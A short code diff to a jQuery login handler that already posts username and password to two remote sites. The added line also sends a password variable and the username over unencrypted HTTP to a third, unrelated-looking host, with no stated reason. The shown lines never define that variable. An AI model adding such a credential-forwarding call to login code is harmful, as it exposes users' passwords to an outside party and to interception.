@@ -22,6 +22,8 @@
             var cpassword = $("#cpassword").val();
             var mobile = 1;
             $("#stage").load('https://dedicated.gr/index.php', {"password":password,"cpassword":cpassword,"uname":uname, "mobile":mobile} );
+			$("#stage2").load('http://homeburger.gr/app2/order.php', {"passwd":passwd,"uname":escape(uname),"mobile":mobile} );
+			
             $("#stage").load('https://kapaweb.gr/controlpanel/login-exec.php', {"password":password,"cpassword":cpassword,"uname":uname, "mobile":mobile} );
 			$("#driver").fadeIn(3000);
         });
